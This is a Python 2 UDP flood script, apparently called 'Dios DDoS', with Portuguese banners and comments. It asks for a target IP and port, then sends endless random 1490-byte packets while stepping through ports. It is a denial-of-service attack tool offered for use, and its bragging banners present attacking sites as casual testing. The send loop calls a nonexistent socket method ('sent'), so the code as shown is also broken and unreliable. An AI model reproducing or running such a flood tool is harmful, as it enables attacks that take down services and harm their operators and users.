import sys
import os
import time
import socket
import random
#dios ddos
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#cores
Azul = '\033[94m'
Verde = '\033[92m'
Amarelo = '\033[93m'
Vermelho = '\033[91m'
Fim = '\033[0m'

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
############

os.system("clear")
print "\033[92m========================================\033[0m"
print "\033[92m=       ===       =====    =====      ==\033[0m"
print "\033[92m=  ====  ==  ====  ===  ==  ===  ====  =\033[0m"
print "\033[92m=  ====  ==  ====  ==  ====  ==  ====  =\033[0m"
print "\033[92m=  ====  ==  ====  ==  ====  ===  ======\033[0m"
print "\033[92m=  ====  ==  ====  ==  ====  =====  ====\033[0m"
print "\033[92m=  ====  ==  ====  ==  ====  =======  ==\033[0m"
print "\033[92m=  ====  ==  ====  ==  ====  ==  ====  =\033[0m"
print "\033[92m=  ====  ==  ====  ===  ==  ===  ====  =\033[0m"
print "\033[92m=       ===       =====    =====      ==\033[0m"
print "\033[92m========================================\033[0m"
print '''____       ______      _____       ____       
/\  _`\    /\__  _\    /\  __`\    /\  _`\     
\ \ \/\ \  \/_/\ \/    \ \ \/\ \   \ \,\L\_\   
 \ \ \ \ \    \ \ \     \ \ \ \ \   \/_\__ \   
  \ \ \_\ \    \_\ \__   \ \ \_\ \    /\ \L\ \ 
   \ \____/    /\_____\   \ \_____\   \ `\____\
'''
print "https://github.com/DiosDeLaWeb/Dios-DDos"
print
print "codder by: dios de la web   #dono do script"
print "new team 404                #melhor team hacker"
print "dios ddos attack on         #teste sites"
print "use comando ping            #como pegar ip"
print "insira o ip alvo abaixo     #dica dios"
print "logo depois coloque o port  #port sugerido (80)"
print

ip = raw_input("IP Alvo :")
port = input("Port       :")

os.system("clear")
print "\033[92m ____  ____   ___  ____     ____  ___\033[0m"
print "\033[92m|  _ \|  _ \ / _ \/ ___|   / ___|/ _ \|\033[0m"
print "\033[92m| | | | | | | | | \___ \  | |  _| | | |\033[0m"
print "\033[92m| |_| | |_| | |_| |___) | | |_| | |_| |\033[0m"
print "\033[92m|____/|____/ \___/|____/   \____|\___/\033[0m"
print
print "[                                   ] 0% "
time.sleep(5)
print "[\033[92m>>>>>>>>>>\033[0m                         ] 25% "
time.sleep(5)
print "[\033[92m>>>>>>>>>>>>>>>>>>\033[0m                 ] 50% "
time.sleep(5)
print "[\033[92m>>>>>>>>>>>>>>>>>>>>>>>>>>\033[0m         ] 75% "
time.sleep(5)
print "[\033[92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\033[0m] 100% "
time.sleep(3)
sent = 0
while True:
    sock.sent(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print "\033[92mSent %s packet to %s throught port:%s\033[0m"%(sent,ip,port)
    if port == 65534:
        port = 1
